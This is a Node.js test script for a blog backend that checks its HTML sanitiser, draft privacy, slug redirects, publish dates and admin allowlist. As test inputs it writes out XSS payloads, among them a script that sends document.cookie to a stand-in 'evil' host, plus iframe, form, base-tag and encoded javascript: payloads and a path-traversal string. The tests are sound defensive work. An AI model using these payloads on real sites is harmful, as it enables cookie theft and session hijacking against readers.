/**
 * The blog — sanitising, slugs, publishing and the admin gate (docs/23-BLOG.md).
 *
 *   node scripts/check-blog.js
 *
 * The assertions that matter most, in order of what would hurt if they broke:
 *
 *   1. **Nothing executable survives the sanitiser.** The body of a post is
 *      rendered with `dangerouslySetInnerHTML` *and* injected into pre-rendered
 *      HTML served to every reader, so a stored payload runs for the whole
 *      audience rather than for its author (utils/sanitizeHtml.js).
 *   2. **A public read never returns a draft.** Unfinished writing served to a
 *      crawler gets indexed as-is and can outrank the finished post for weeks.
 *   3. **A renamed post keeps answering at its old address**, or every inbound
 *      link and every bit of ranking the page earned is discarded.
 *   4. **The admin allowlist fails closed** — empty means nobody, and an
 *      identity with no email is refused rather than waved through.
 */
require("../src/config/env");

const mongoose = require("mongoose");
const { connectDB } = require("../src/config/db");
const blogService = require("../src/services/blogService");
const blogRepository = require("../src/repositories/blogRepository");
const requireAdmin = require("../src/middlewares/requireAdmin");
const config = require("../src/config/env");
const { sanitizeHtml } = require("../src/utils/sanitizeHtml");
const blogStorage = require("../src/utils/blogStorage");
const BlogPost = require("../src/models/blogPost");
const { BLOG_STATUS } = require("../src/constants");

let failures = 0;

const check = (label, actual, want) => {
  const pass = JSON.stringify(actual) === JSON.stringify(want);
  if (!pass) failures += 1;
  console.log(
    `  ${pass ? "PASS" : "FAIL"}  ${label}${pass ? "" : ` (got ${JSON.stringify(actual)}, want ${JSON.stringify(want)})`}`
  );
};

const checkTrue = (label, actual) => check(label, Boolean(actual), true);

const refuses = async (label, fn, code) => {
  try {
    await fn();
    failures += 1;
    console.log(`  FAIL  ${label} (it was allowed)`);
  } catch (error) {
    const pass = code ? error.code === code : true;
    if (!pass) failures += 1;
    console.log(`  ${pass ? "PASS" : "FAIL"}  ${label}${pass ? "" : ` (got ${error.code}, want ${code})`}`);
  }
};

/** Runs the middleware and reports the error it passed to `next`, or null. */
const adminVerdict = (user, claims = null) =>
  new Promise((resolve) => {
    requireAdmin({ user, firebaseClaims: claims }, {}, (error) => resolve(error || null));
  });

(async () => {
  await connectDB();

  const created = [];
  const stamp = Date.now();

  /* ------------------------- 1. The sanitiser ------------------------- */

  console.log("--- what survives the sanitiser ---");

  const dangerous = [
    ["a script tag", '<p>Real text</p><script>fetch("//evil?c="+document.cookie)</script>'],
    ["an onerror handler", '<img src=x onerror="alert(1)">'],
    ["a javascript: link", '<a href="javascript:alert(1)">click</a>'],
    ["an entity-encoded javascript: link", '<a href="java&#x09;script:alert(1)">click</a>'],
    ["an iframe", '<iframe src="//evil.com"></iframe>'],
    ["a form that harvests passwords", '<form action="//evil"><input name="password"></form>'],
    ["a base tag that repoints every relative link", '<base href="//evil.com/">'],
    ["svg with script inside", "<svg><script>alert(1)</script></svg>"],
    ["a data: URL document", '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'],
  ];

  for (const [label, input] of dangerous) {
    const output = sanitizeHtml(input);
    const clean =
      !/<script|<iframe|<form|<base|<svg|onerror|javascript:|data:text/i.test(output);
    check(`${label} is removed`, clean, true);
  }

  check(
    "ordinary prose is untouched",
    sanitizeHtml("<h2>Heading</h2><p>Some <strong>bold</strong> text.</p>"),
    "<h2>Heading</h2><p>Some <strong>bold</strong> text.</p>"
  );
  checkTrue(
    "external links get noopener, which stops the opened page reaching back",
    sanitizeHtml('<a href="https://example.com">x</a>').includes('rel="noopener noreferrer"')
  );
  checkTrue(
    "images are lazy-loaded, because LCP is a ranking input",
    sanitizeHtml('<img src="/uploads/blog/a.png">').includes('loading="lazy"')
  );

  /* --------------------- 2. A cover image cannot be foreign -------------- */

  console.log("\n--- cover images ---");
  check("a path this server produced is accepted", blogStorage.isOwnUrl("/uploads/blog/abc.png"), true);
  check("another host is refused", blogStorage.isOwnUrl("https://evil.com/x.png"), false);
  check("traversal out of the directory is refused", blogStorage.isOwnUrl("/uploads/blog/../../etc/passwd"), false);
  check("a lookalike path is refused", blogStorage.isOwnUrl("/uploads/blogevil/x.png"), false);

  /* ------------------------- 3. Drafts are private ---------------------- */

  console.log("\n--- a new post ---");

  const draft = await blogService.createPost(
    {
      title: `Split rent with roommates ${stamp}`,
      contentHtml: "<h2>How</h2><p>Some words about splitting rent fairly.</p><script>alert(1)</script>",
      tags: ["Rent", "rent", "  Flatmates  "],
      metaDescription: "How to split rent with roommates without arguments.",
      faqs: [{ q: "Is it free?", a: "Yes." }],
    },
    { _id: new mongoose.Types.ObjectId(), name: "Yunus" }
  );
  created.push(draft._id);

  check("starts as a draft", draft.status, BLOG_STATUS.DRAFT);
  check("has no publish date yet", draft.publishedAt, null);
  check("the slug is derived from the title", draft.slug, `split-rent-with-roommates-${stamp}`);
  checkTrue("the script tag never reached the database", !draft.contentHtml.includes("<script"));
  check("tags are lowercased and de-duplicated", draft.tags, ["rent", "flatmates"]);
  checkTrue("an excerpt is generated when none was given", draft.excerpt.length > 0);
  checkTrue("the word count is cached for listings", draft.wordCount > 0);

  const hiddenFromPublic = await blogRepository.findPublishedBySlug(draft.slug);
  check("a draft is invisible to the public read", hiddenFromPublic, null);

  const publicList = await blogRepository.listPublished({ page: 1, limit: 50 });
  check(
    "a draft is absent from the public index",
    publicList.items.some((item) => item.slug === draft.slug),
    false
  );

  const renderFeed = await blogRepository.listForRender();
  check(
    "a draft is absent from the pre-render feed, so it cannot be built into a static page",
    renderFeed.some((item) => item.slug === draft.slug),
    false
  );

  /* -------------------------- 4. Readiness ------------------------------ */

  console.log("\n--- the publish checklist ---");
  const issues = blogService.readinessIssues(draft);
  checkTrue("a post with no cover image is flagged", issues.some((i) => i.includes("cover image")));
  checkTrue("a thin post is flagged", issues.some((i) => i.includes("words")));

  /* -------------------------- 5. Publishing ----------------------------- */

  console.log("\n--- publishing ---");
  const { post: published, deploy } = await blogService.publishPost(draft._id);

  check("the post is now published", published.status, BLOG_STATUS.PUBLISHED);
  checkTrue("it has a publish date", Boolean(published.publishedAt));
  check(
    "the deploy hook is reported as unconfigured rather than silently skipped",
    deploy.triggered,
    false
  );
  checkTrue("and the author is told why", Boolean(deploy.reason));

  const nowPublic = await blogRepository.findPublishedBySlug(published.slug);
  checkTrue("the public read finds it", Boolean(nowPublic));

  const firstPublishedAt = published.publishedAt.getTime();
  const { post: edited } = await blogService.updatePost(published._id, {
    contentHtml: "<h2>How</h2><p>Rewritten, at greater length, with more detail.</p>",
  });
  check(
    "editing does not re-stamp the publication date",
    edited.publishedAt.getTime(),
    firstPublishedAt
  );
  checkTrue("but it does move the modified date", edited.contentUpdatedAt.getTime() >= firstPublishedAt);
  /**
   * `dateModified` before `datePublished` is incoherent, and Google's Rich
   * Results test reports it as an error on the article markup — enough to lose
   * the rich result. A draft written days before it goes live hits this by
   * default, so it is clamped at publish (blogService.publishPost).
   */
  checkTrue(
    "the modified date never precedes the publish date",
    edited.contentUpdatedAt.getTime() >= edited.publishedAt.getTime()
  );

  /* ------------------------- 6. Renaming a post ------------------------- */

  console.log("\n--- renaming a published post ---");
  const oldSlug = edited.slug;
  const { post: renamed } = await blogService.updatePost(edited._id, {
    slug: `flatmate-rent-guide-${stamp}`,
  });

  check("the slug changed", renamed.slug, `flatmate-rent-guide-${stamp}`);
  checkTrue("the old address is remembered", renamed.previousSlugs.includes(oldSlug));

  const redirect = await blogService.getPublishedBySlug(oldSlug);
  check("the old address redirects instead of 404ing", redirect.redirectTo, renamed.slug);

  const viaNew = await blogService.getPublishedBySlug(renamed.slug);
  checkTrue("and the new address serves the post", Boolean(viaNew.post));

  await refuses(
    "a second post cannot claim the retired address",
    () =>
      blogService.createPost(
        { title: "Impostor", slug: oldSlug, contentHtml: "<p>x</p>" },
        { _id: new mongoose.Types.ObjectId() }
      ),
    "BLOG_SLUG_TAKEN"
  );

  await refuses(
    "nor the live one",
    () =>
      blogService.createPost(
        { title: "Impostor", slug: renamed.slug, contentHtml: "<p>x</p>" },
        { _id: new mongoose.Types.ObjectId() }
      ),
    "BLOG_SLUG_TAKEN"
  );

  /* ------------------------ 7. Unpublishing ----------------------------- */

  console.log("\n--- unpublishing ---");
  const { post: withdrawn } = await blogService.unpublishPost(renamed._id);
  check("it goes back to draft", withdrawn.status, BLOG_STATUS.DRAFT);
  await refuses(
    "and the public read stops finding it",
    () => blogService.getPublishedBySlug(withdrawn.slug),
    "BLOG_POST_NOT_FOUND"
  );

  /* --------------------------- 8. The admin gate ------------------------ */

  console.log("\n--- who may reach the admin panel ---");

  const configured = config.adminEmails;
  console.log(`  (ADMIN_EMAILS = ${configured.length ? configured.join(", ") : "<empty>"})`);

  if (configured.length === 0) {
    console.log("  SKIP  no ADMIN_EMAILS configured — set one to exercise the allowlist");
  } else {
    const allowed = configured[0];
    check("an allowlisted account is let through", await adminVerdict({ email: allowed }), null);
    check(
      "the comparison is case-insensitive, because email addresses are",
      await adminVerdict({ email: allowed.toUpperCase() }),
      null
    );
    checkTrue(
      "an ordinary signed-in account is refused",
      (await adminVerdict({ email: `someone-else-${stamp}@example.com` }))?.statusCode === 403
    );
    checkTrue(
      "an identity carrying no email is refused rather than waved through",
      (await adminVerdict({}))?.statusCode === 403
    );
    checkTrue(
      "and so is an anonymous caller",
      (await adminVerdict(null))?.statusCode === 403
    );
    checkTrue(
      "the refusal says nothing about why, so probing teaches nothing",
      (await adminVerdict({ email: "nope@example.com" }))?.message === "Not allowed"
    );
  }

  /* ------------------------------- Cleanup ------------------------------ */

  console.log("\n--- cleanup ---");
  await BlogPost.deleteMany({ _id: { $in: created } });
  console.log("  done");

  console.log(`\n${failures === 0 ? "ALL PASS" : `${failures} FAILURE(S)`}`);
  await mongoose.disconnect();
  process.exit(failures === 0 ? 0 : 1);
})().catch(async (e) => {
  console.error("FAILED:", e.stack || e.message);
  await mongoose.disconnect().catch(() => {});
  process.exit(1);
});
